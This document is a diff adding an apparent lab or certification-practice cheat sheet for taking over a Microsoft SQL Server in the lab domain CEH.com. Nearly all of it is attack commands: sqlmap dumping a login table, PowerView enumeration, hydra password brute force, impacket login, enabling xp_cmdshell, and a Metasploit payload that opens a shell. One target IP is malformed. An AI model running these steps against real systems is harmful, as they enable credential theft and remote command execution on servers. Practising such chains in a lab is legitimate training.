@@ -1,0 +1,41 @@
+Get credentials to MSSQL - possibility 1
+
+Step 1 – Log in to the website (SQLi with ZAP or create account)
+Step 2 – Get session cookie (logged in user)
+Step 3 - Test + enumerate databases +dump
+sqlmap -u "URL" --cookie="cookie" --dbs
+sqlmap -u "URL" --cookie="cookie" -D moviescope --tables
+sqlmap -u "URL" --cookie="cookie" -D moviescope -T  User_Login --dump
+_____________________________________________________________________________________________
+Get credentials to MSSQL - possibility 2
+powershell -EP Bypass
+. .\PowerView.ps1
+Get-NetComputer
+Get-NetGroup 
+Get-NetUser
+
+hydra -L <USER_LIST> -P <PASSWORD_LIST> <TARGET_IP> mssql 
+hydra -l SQL_srv -P /root/ADtools/rockyou.txt 10.10.2.1.30 mssql
+_____________________________________________________________________________________________
+Step 4 - Log into the MSSQL service using mssqlclient.py and check if xp_cmdshell is enabled  
+
+python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433
+
+check whether xp_cmdshell is enabled in SQL Server
+SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';
+
+optional: if disabled try to enable:
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+
+Step 5 - Exploit xp_cmdshell enabled
+msfconsole
+search mssql_payload
+use exploit/windows/mssql/mssql_payload
+set RHOST 10.10.1.30
+set USERNAME SQL_srv
+set PASSWORD batman
+set DATABASE master
+exploit
+shell
+whoami
